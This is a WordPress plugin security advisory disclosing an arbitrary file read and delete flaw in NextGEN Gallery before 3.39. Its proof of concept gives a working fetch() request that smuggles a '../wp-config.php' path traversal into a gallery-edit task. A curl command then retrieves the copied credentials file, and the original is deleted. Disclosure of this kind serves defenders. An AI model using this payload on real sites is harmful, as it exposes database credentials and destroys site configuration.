## WordPress Plugin Vulnerabilities

# NextGEN Gallery < 3.39 - Admin+ Arbitrary File Read and Delete

### Description

The plugin is vulnerable to Arbitrary File Read and Delete due to a lack of input parameter validation in the `gallery\_edit` function, allowing an attacker to access arbitrary resources on the server.

### Proof of Concept

1. Create a Gallery called "My Gallery" and note its ID.
2. Run the following code in your browser, replacing ADMIN\_USERNAME, ADMIN\_PASSWORD, and GALLERY\_ID accordingly.
await (await fetch("/index.php", {
"credentials": "include",
"headers": {
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
},
"body": 'photocrati\_ajax=1&action=enqueue\_nextgen\_api\_task\_list&q=ADMIN\_USERNAME&z=ADMIN\_PASSWORD&app\_config={}&task\_list=[{"name":"x","type":"gallery\_edit","query":{"id":"GALLERY\_ID"},"object":{"name":"x","image\_list":[{"path":"../wp-config.php","filename":"xxxxxxx.jpg"}]}}]&extra\_data={}',
"method": "POST",
"mode": "cors"
})).text();
3. Download the file contents with the following `curl` command:
curl http://SITE\_URL/wp-content/gallery/my-gallery/xxxxxxx.jpg
4. Note that the `wp-config.php` file has been deleted.
